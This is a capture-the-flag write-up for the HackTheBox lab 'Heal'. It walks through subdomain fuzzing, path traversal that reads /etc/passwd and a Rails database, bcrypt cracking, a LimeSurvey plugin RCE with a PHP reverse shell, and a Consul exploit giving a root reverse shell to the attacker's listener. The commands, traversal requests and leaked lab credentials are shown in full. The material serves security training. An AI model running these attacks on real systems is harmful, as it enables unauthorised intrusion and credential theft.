---
title: Heal Lab HackTheBox
date: 09-02-2025
layout: post
categories:
  - Hack The Box
tags:
  - blog
  - ctf
  - medium
  - hackthebox
  - linux
image: 
    path: /assets/img/sample/heal/Heal.jpg
    alt: Heal Lab HackTheBox
---

## Introduction 

Heal is a lab that provides all  the knowledge required of a pentester or red team, such as enumeration, scanning, fuzzing directories, fuzzing subdomains, password attacks, privilege escalation, port redirection and tunneling and more.

## Scanning 

First, add `10.10.11.46   heal.htb` into `/etc/hosts` file.

Then, I use tool `nmap` to scan ports.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ nmap -A 10.10.11.46
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 01:17 EST
Nmap scan report for 10.10.11.46
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   36.57 ms 10.10.14.1
2   37.16 ms 10.10.11.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.05 seconds
~~~

I used ffuf for directory brute-forcing with a common wordlist on `http://heal.htb`, but I found nothing.
I tried to register an account but it was not successful.

![](/assets/img/sample/heal/error_sigin.png)

## Fuzzing Directories

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ ffuf -u http://heal.htb/ -w /usr/share/wordlists/dirb/common.txt -H "HOST:FUZZ.heal.htb" -fc 301 -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://heal.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 64ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1639 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
~~~

I proceed to add subdomain `api.heal.htb` into the `/etc/hosts` file. It looks like this:

~~~ 
10.10.11.46     heal.htb    api.heal.htb
~~~

I tried accessing the URL `http://api.heal.htb` and it worked.

![](/assets/img/sample/heal/rail_page.png)

Then I can register an account at domain `http://heal.htb`.

![](/assets/img/sample/heal/take_survey.png)

![](/assets/img/sample/heal/login.png)

I click button `TAKE THE SURVEY`, and found one more subdomain `survey.heal.htb`. I proceed to add subdomain `survey.heal.htb` into the `/etc/hosts` file. It looks like this:

~~~ 
10.10.11.46     heal.htb    api.heal.htb    survey.heal.htb
~~~

![](/assets/img/sample/heal/load_page.png)
![](/assets/img/sample/heal/raplh.png)

I used `disearch` for directory brute-forcing on `http://survey.heal.htb` and found some interesting stuff.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ dirsearch -u "http://take-survey.heal.htb/index.php/" -t 50 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/trit/HackTheBox/Heal/reports/http_take-survey.heal.htb/_index.php__25-02-10_02-22-16.txt

Target: http://take-survey.heal.htb/

[02:22:16] Starting: index.php/
[02:22:34] 200 -   75KB - /index.php/admin/mysql2/index.php
[02:22:50] 200 -   75KB - /index.php/claroline/phpMyAdmin/index.php
[02:23:17] 200 -   74KB - /index.php/myadmin2/index.php
[02:23:23] 200 -   75KB - /index.php/phpmyadmin/phpmyadmin/index.php
[02:23:24] 200 -   74KB - /index.php/pma-old/index.php
[02:23:36] 200 -   74KB - /index.php/sugarcrm/index.php?module=Contacts&action=ShowDuplicates
[02:23:40] 200 -   75KB - /index.php/tools/phpMyAdmin/index.php
[02:23:48] 200 -   75KB - /index.php/xampp/phpmyadmin/index.php

Task Completed
~~~

I tried access `http://take-survey.heal.htb/index.php/admin` and it took me a new page.

![](/assets/img/sample/heal/admin_login.png)

I used the tool `Burp Suite` to perform packet interception.

![](/assets/img/sample/heal/export_img.png)

Send a request like in the image above to Repeater, then change first line of the request from `POST /exports HTTP/1.1` to `GET /download?filename=../../../../../etc/passwd HTTP/1.1` and click the `Send` button. Finally, we get te folowing responses:

~~~ 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 10 Feb 2025 07:33:49 GMT
Content-Type: application/octet-stream
Content-Length: 2120
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers:
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: attachment; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 30e40a84-44b5-4f68-a2e3-03085bf22575
x-runtime: 0.001975
vary: Origin

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
~~~

Because I know the is using the web framework [Ruby on Rails](https://rubyonrails.org/).

![](/assets/img/sample/heal/rail_page.png)

I found file database in server [here](https://dev.to/andreimaxim/the-rails-databaseyml-file-4dm9).

![](/assets/img/sample/heal/export_img.png)

Send a request like in the image above to Repeater, then change first line of the request from `POST /exports HTTP/1.1` to `GET download?filename=../../config/database.yml HTTP/1.1` and click the `Send` button. Finally, we get te folowing responses:


![](/assets/img/sample/heal/database.png)

I dowloaded file on the attack machine.

![](/assets/img/sample/heal/export_img.png)

Send a request like in the image above to Repeater, then change first line of the request from `POST /exports HTTP/1.1` to `GET /download?filename=../../storage/development.sqlite3 HTTP/1.1` and click the `Send` button. Finally, we get te folowing responses:


![](/assets/img/sample/heal/dowload.png)

I found a password hash like `$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`, I add it to the file `hash` on the attack machine.

## Crack Password

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ nano hash

┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ cat hash
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG

┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG

 Not Found.
--------------------------------------------------
~~~

I tried using tool `hash-identifier`, but couldn't identify the hash code, so I tried access [here](https://nth.skerritt.blog/) and found that the hash type is `brcypt`


![](/assets/img/sample/heal/find_hash.png)

I used the tool `hashcat` brute-forcing a password.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --force

hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 3826/7716 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9S...GCSZnG
Time.Started.....: Mon Feb 10 04:34:51 2025, (1 min, 13 secs)
Time.Estimated...: Mon Feb 10 04:36:04 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        7 H/s (8.26ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 496/14344385 (0.00%)
Rejected.........: 0/496 (0.00%)
Restore.Point....: 480/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Candidate.Engine.: Device Generator
Candidates.#1....: teiubesc -> kelsey
Hardware.Mon.#1..: Util: 86%

Started: Mon Feb 10 04:33:32 2025
Stopped: Mon Feb 10 04:36:06 2025
~~~

 
![](/assets/img/sample/heal/admin_login.png)

Login with credential: **ralph@heal.htb/147258369**

## Exploitation

Because web server running `LimeSurvey Community Edition Version 6.6.4`, so I found exploit in ineternet [here](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE).

- Clone github.
- Edit `config.xml` and add line `<version>6.0</version>`.
- Edit IP and Port of the attacking machine in the `php-rev.php` file.
- Delete origibal `Y1LD1R1M.zip` file.
- Zip file `config.xml` and `php-rev.php` into `Y1LD1R1M.zip`.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
Cloning into 'Limesurvey-RCE'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 24 (delta 2), reused 0 (delta 0), pack-reused 18 (from 1)
Receiving objects: 100% (24/24), 10.00 KiB | 2.50 MiB/s, done.
Resolving deltas: 100% (5/5), done.


┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ cd Limesurvey-RCE

┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ ls
README.md  Y1LD1R1M.zip  config.xml  exploit.py  php-rev.php

┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ nano config.xml

┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ cat config.xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>

┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ nano php-rev.php

┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ rm Y1LD1R1M.zip

┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ zip Y1LD1R1M.zip config.xml php-rev.php
  adding: config.xml (deflated 56%)
  adding: php-rev.php (deflated 61%)
~~~

Upload the zip file to the server's **Plugin** section,. by clicking **Configuration -> Settings -> Plugins -> Uploads & Install in turn**. Finally, click the **Active** button of the **Y1LD1R1M.zip** file.

Start a `nc` listener, Then acccess url **http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php**


~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ nc -lnvp 4444
~~~

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Heal/Limesurvey-RCE]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.11.46] 46116
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:18:56 up  2:16,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ron      pts/1    10.10.16.20      08:34    1:24m  0.02s  0.01s ssh -L 8500:127.0.0.1:8500 ron@heal.htb
ron      pts/2    127.0.0.1        08:47    1:24m  0.02s  0.02s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@heal:/$ cat /var/www/limesurvey/application/config/config.php
cat /var/www/limesurvey/application/config/config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
www-data@heal:/$
~~~

We have a credential **ron/AdmiDi0_pA$$w0rd**

## Get User Flag

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ ssh ron@10.10.11.46
ron@10.10.11.46's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Feb 10 10:26:48 AM UTC 2025

  System load:           0.0
  Usage of /:            68.0% of 7.71GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             264
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.46
  IPv6 address for eth0: dead:beef::250:56ff:feb9:38bd


Expanded Security Maintenance for Applications is not enabled.

29 updates can be applied immediately.
18 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Feb 10 10:26:48 2025 from 10.10.14.45
ron@heal:~$ ls
exploit.py  user.txt
ron@heal:~$ cat user.txt
dd26b99684*****ea0791db8284e5791
~~~

## Privilege Escalation

~~~ shell 
ron@heal:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 ::1:8500                :::*                    LISTEN
udp        0      0 127.0.0.1:8600          0.0.0.0:*
udp        0      0 0.0.0.0:5353            0.0.0.0:*
udp        0      0 0.0.0.0:48411           0.0.0.0:*
udp        0      0 127.0.0.53:53           0.0.0.0:*
udp        0      0 0.0.0.0:68              0.0.0.0:*
udp        0      0 127.0.0.1:8301          0.0.0.0:*
udp        0      0 127.0.0.1:8302          0.0.0.0:*
udp6       0      0 :::41954                :::*
udp6       0      0 :::5353                 :::*
~~~
Access local host **http://127.0.0.1:8500/**

![](/assets/img/sample/heal/version_local.png)

Enter `Ctrl + u` view source and see version in  server ->CONSUL_VERSION: 1.19.2

![](/assets/img/sample/heal/version.png)

I found an exploit file [here](https://www.exploit-db.com/exploits/51117). Copy it and save it as `exploit.py` on the attack machine.

~~~ shell
- One command run a `nc` listener like this: 
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ nc -lnvp 5555
~~~

- Another command run script like this:

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ python3 exploit.py 127.0.0.1 8500 10.10.14.45 5555 0

[+] Request sent successfully, check your listener
~~~


Finally, we have the root flag.

~~~
┌──(trit㉿chimp)-[~/HackTheBox/Heal]
└─$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.11.46] 51686
bash: cannot set terminal process group (7038): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# ls
ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@heal:/# cat /root/root.txt
cat /root/root.txt
1653d234a1*****b9e3719093c026bc4
~~~

***Thanks for reading the article.***

